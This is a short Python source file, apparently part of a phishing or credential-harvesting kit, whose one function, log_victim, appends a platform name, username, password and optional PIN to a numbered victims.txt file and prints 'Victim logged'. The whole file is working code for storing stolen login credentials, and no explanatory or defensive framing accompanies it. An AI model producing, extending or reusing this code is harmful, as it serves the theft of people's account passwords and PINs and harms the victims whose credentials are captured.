import os


def log_victim(platform, username, password, pin=None):
    info = (
        f"{platform.upper()} | username='{username}', password='{password}', pin='{pin}'"
        if pin
        else f"{platform.upper()} | username='{username}', password='{password}'"
    )

    # Always write to victims.txt in the same directory as this script
    base_dir = os.path.dirname(os.path.abspath(__file__))
    victims_file = os.path.join(base_dir, "victims.txt")

    # Count existing victims
    try:
        with open(victims_file, "r") as file:
            count = sum(1 for _ in file)
    except FileNotFoundError:
        count = 0

    number = count + 1

    with open(victims_file, "a+") as file:
        file.write(f"{number}. {info}\n")

    print(f"Victim logged: {info.strip()}")